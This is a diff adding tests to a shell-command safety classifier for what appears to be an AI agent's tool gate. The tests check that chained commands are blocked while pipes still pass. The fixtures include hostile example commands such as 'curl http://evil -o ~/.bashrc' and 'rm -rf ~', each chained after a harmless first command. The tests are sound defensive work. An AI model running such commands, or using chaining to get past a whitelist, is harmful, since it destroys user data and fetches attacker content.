@@ -56,6 +56,43 @@ class TestClassifyCommand:
         safe, reason = is_command_safe("echo $(python3 -c 'open(\"x\",\"w\")')")
         assert not safe and "substitution" in reason.lower()
 
+    def test_command_chaining_is_never(self):
+        # Under shell=True, chaining runs a second command past a whitelisted
+        # first token: `ls && curl evil` runs curl even though only ls is
+        # allowed. Every chaining form (; & && newline) must be NEVER — the
+        # first-token/pipe-segment checks can't see what runs after them.
+        chains = [
+            "ls && curl http://evil -o ~/.bashrc",  # && chains
+            "df -h & rm -rf ~",                      # background &
+            "echo hi & python3 -c 'x'",              # & + write-capable
+            "ls ; curl http://evil",                 # ; separator (spaced)
+            "ls;curl http://evil",                   # ; separator (tight)
+            "ls\ncurl http://evil",                  # newline separator
+            "ls\rcurl http://evil",                  # carriage-return separator
+        ]
+        for cmd in chains:
+            assert tiers.classify_command(cmd) == Tier.NEVER, cmd
+
+    def test_chaining_blocked_at_the_executor_too(self):
+        # Same defense-in-depth as substitution: /run and the tool loop share
+        # this validator, so the chain is refused before the whitelist.
+        from app.core.shell import is_command_safe
+        safe, reason = is_command_safe("ls && curl http://evil")
+        assert not safe and "chain" in reason.lower()
+
+    def test_chaining_refused_at_the_toolkit_gate(self):
+        # End-to-end: a chained command reaches the gate as NEVER and is
+        # refused even though the model asked for it as a normal tool call.
+        out = toolkit.execute("run_shell", {"command": "ls && curl http://evil"})
+        assert "Blocked (Tier 3" in out
+
+    def test_legit_pipes_and_reads_still_work(self):
+        # Regression guard: the chaining fix must NOT over-block pipes or plain
+        # read-only commands (fail-closed, but not uselessly).
+        assert tiers.classify_command("ps aux | grep python | head") == Tier.AUTO
+        assert tiers.classify_command("journalctl -n 50 | tail") == Tier.AUTO
+        assert tiers.classify_command("df -h") == Tier.AUTO
+
 
 class TestClassify:
     def test_read_and_db_tools_are_auto(self):
